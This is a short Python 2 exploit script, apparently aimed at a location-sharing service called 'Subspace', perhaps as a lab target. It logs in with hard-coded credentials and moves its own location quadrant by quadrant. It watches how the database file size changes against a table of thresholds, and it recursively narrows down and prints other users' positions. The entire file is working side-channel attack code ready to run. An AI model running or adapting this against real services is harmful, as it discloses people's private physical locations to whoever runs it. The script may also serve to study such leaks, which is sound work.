#!/usr/bin/python -u

import time

from util import DB_PRECISION, DB_PRECISION_NDIGITS, Rectangle, \
    get_db_length, set_location, unset_location, op_stats


# Credentials to use for the exploit
credentials = ('mal', 'password')

# How long between making a change and testing the size of the DB
# file.
sleep_interval = 0.1

thresholds = [
    931,
    890,
    849,
    808,
    767,
    726,
    685,
    644,
    603,
    562,
    521,
    480,
    439,
    398,
    357,
    316,
    275,
    234,
    193,
    152,
    111,
    70,
    58,
]


# The exploit itself.
def list_locations():
    """
    List the locations of all Subspace users.
    """
    # Get initial size.
    unset_location(credentials)
    time.sleep(sleep_interval)
    db_length_initial = get_db_length()

    def recurse(depth, path, rectangle):
        quadrants = rectangle.quadrants()
        non_empty_quadrants = []
        for idx, quadrant in enumerate(quadrants):
            qpath = path + str(idx)
            print "testing quadrant %s -- %s" % (qpath, quadrant)

            set_location(credentials, quadrant.center())
            time.sleep(sleep_interval)
            db_length = get_db_length()

            # Compute the change in size.
            db_length_delta = db_length - db_length_initial

            if db_length_delta < thresholds[depth]:
                if quadrant.width() <= DB_PRECISION:
                    print
                    print "***** Found user(s) *****"
                    print "    %s (precision = %s)" % (
                        quadrant.center(),
                        DB_PRECISION,
                    )
                    print "    %s" % op_stats
                    print
                else:
                    non_empty_quadrants.append((depth+1, qpath, quadrant))

        for entry in non_empty_quadrants:
            recurse(*entry)

    recurse(0, '', Rectangle.FULL)


# Run the exploit.
if __name__ == '__main__':
    list_locations()
